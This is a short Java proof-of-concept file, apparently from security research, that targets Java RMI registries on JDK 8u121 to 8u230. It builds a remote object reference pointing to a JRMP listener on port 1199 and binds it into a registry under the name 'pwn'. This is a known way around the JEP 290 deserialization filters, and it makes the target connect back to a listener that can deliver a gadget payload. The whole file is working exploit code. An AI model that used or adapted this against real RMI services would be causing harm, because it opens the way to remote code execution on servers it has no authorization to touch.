package jep290;

import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.annotation.Retention;
import java.lang.reflect.AnnotatedArrayType;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
//Bypass 8u121~8u230
public class JRMPClient {

        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry(1099);
            ObjID id = new ObjID(new Random().nextInt());
            TCPEndpoint te = new TCPEndpoint("localhost", 1199);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
          RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);   // BindExploit handler = new BindExploit(ref);
            System.out.println(System.getProperty("java.version"));
// lookup方法也可以，但需要手动模拟lookup方法的流程
            registry.bind("pwn", handler);
            System.out.println(System.getProperties());
        }

}
